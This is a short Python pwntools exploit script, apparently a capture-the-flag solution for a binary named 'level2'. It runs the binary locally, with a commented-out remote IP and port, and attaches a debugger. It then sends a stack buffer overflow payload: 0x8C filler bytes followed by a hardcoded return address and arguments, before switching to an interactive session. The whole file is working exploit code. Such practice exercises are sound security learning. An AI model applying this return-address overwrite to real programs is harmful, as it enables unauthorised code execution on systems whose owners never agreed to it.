from pwn import *

r = process("./level2")
#r = remote("106.15.186.69",30013)
elf = ELF('./level2')
context.log_level='DEBUG'
gdb.attach(r)
#payload = "\x24\xa0\x04\x08"+"\x77"*0x60+"\x24\xa0\x04\x08"*8+"\x24\xa0\x04\x08"+"\x24\xa0\x04\x08"+"\x9E\x84\x04\x08"
payload = 'A' * 0x8C +"\x9E\x84\x04\x08" + p32(4) + "\x24\xa0\x04\x08"
#r.recv()
r.send(payload)
#print r.recv()

r.interactive()

